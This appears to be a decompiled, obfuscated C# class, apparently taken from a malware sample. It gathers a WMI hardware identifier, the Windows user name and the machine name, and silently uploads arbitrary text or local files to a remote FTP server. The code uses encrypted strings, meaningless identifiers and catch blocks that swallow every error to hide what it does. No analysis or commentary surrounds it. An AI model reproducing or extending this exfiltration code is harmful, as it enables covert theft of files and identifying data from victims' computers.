using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wDtIYaxdpawEu;

internal sealed class mzYnDQcPQMD
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string YyGTVHZwZCQyr()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107380934));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107380881)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107380864);
			ManagementObject val3 = new ManagementObject(getString_0(107380859) + text2 + getString_0(107380818));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107380845)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107401573) : text;
		}
	}

	public static void YsIQNECBfkXj(string KzhoJCOuaTx = "URL", string RKDKdjqEky = "USERNAME", string wTsPDrNvZoLTk = "ACCESO", string IfgfCKVAlM = "")
	{
		try
		{
			string text = YyGTVHZwZCQyr();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(KzhoJCOuaTx + getString_0(107349225) + Environment.UserName + getString_0(107349692) + Environment.MachineName + getString_0(107349703) + text + getString_0(107349698));
			ftpWebRequest.Method = getString_0(107380788);
			ftpWebRequest.Credentials = new NetworkCredential(RKDKdjqEky, wTsPDrNvZoLTk);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(IfgfCKVAlM);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void ubBkhifeJCfa(string siskZiMGpqxywb = "URL", string twehairWPbH = "USERNAME", string pQDuISXzUSWZhF = "ACCESO", string MWDroDcRTHXU = "")
	{
		try
		{
			string text = YyGTVHZwZCQyr();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(siskZiMGpqxywb + getString_0(107349225) + Environment.UserName + getString_0(107349692) + Environment.MachineName + getString_0(107349703) + text + getString_0(107349703) + Path.GetFileName(MWDroDcRTHXU));
			ftpWebRequest.Method = getString_0(107380788);
			ftpWebRequest.Credentials = new NetworkCredential(twehairWPbH, pQDuISXzUSWZhF);
			byte[] array = File.ReadAllBytes(MWDroDcRTHXU);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static mzYnDQcPQMD()
	{
		Strings.CreateGetStringDelegate(typeof(mzYnDQcPQMD));
	}
}
